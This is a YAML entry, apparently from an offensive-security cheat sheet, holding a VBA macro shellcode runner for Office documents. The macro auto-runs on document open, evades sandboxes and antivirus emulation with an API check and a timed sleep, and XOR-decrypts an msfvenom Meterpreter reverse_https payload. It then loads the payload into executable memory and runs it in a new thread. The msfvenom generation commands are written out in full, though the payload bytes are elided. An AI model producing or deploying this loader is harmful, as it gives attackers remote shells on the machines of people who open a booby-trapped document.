---
description: |
  Shellrunner in a VBA macro can be used inside a Office product. This code make use of encrypted shellcode with XOR and has a Sleep function which ensures that it is not tested against an AV emulator.

  Command Reference:

  	byte[] buf: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key a


command: |
    Shellcode for VBA in Office products

code: |
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
    Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
    Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Long
    Private Declare PtrSafe Function FlsAlloc Lib "kernel32" (ByVal lpCallback As LongPtr) As Long

    Sub Document_Open()
      ShellcodeRunner
    End Sub

    Sub AutoOpen()
      ShellcodeRunner
    End Sub

    Function ShellcodeRunner()
      Dim buf As Variant
      Dim tmp As LongPtr
      Dim addr As LongPtr
      Dim counter As Long
      Dim data As Long
      Dim res As Long
      Dim dream As Integer
      Dim before As Date
  
      ' Check if we're in a sandbox by calling a rare-emulated API
      If IsNull(FlsAlloc(tmp)) Then
        Exit Function
      End If

      ' Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction
      dream = Int((1500 * Rnd) + 2000)
      before = Now()
      Sleep (dream)
      If DateDiff("s", t, Now()) < dream Then
        Exit Function
      End If

      ' msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.240.178 LPORT=443 EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key a
      buf = Array(31, 33, ..., 33, 37)

      ' XOR-decrypt the shellcode
      For i = 0 To UBound(buf)
        buf(i) = buf(i) Xor Asc("a")
      Next i

      ' &H3000 = 0x3000 = MEM_COMMIT | MEM_RESERVE
      ' &H40 = 0x40 = PAGE_EXECUTE_READWRITE
      addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

      For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
      Next counter

      res = CreateThread(0, 0, addr, 0, 0, 0)
    End Function


items:
    - Shell
services:
    - 
OS:
    - Windows
attack_types:
    - Persistence
    - Injection
references:
    - https://ppn.snovvcrash.rocks/red-team/maldev/code-injection/shellcode-runners#c-dll-with-powershell-cradle-in-memory
--- 


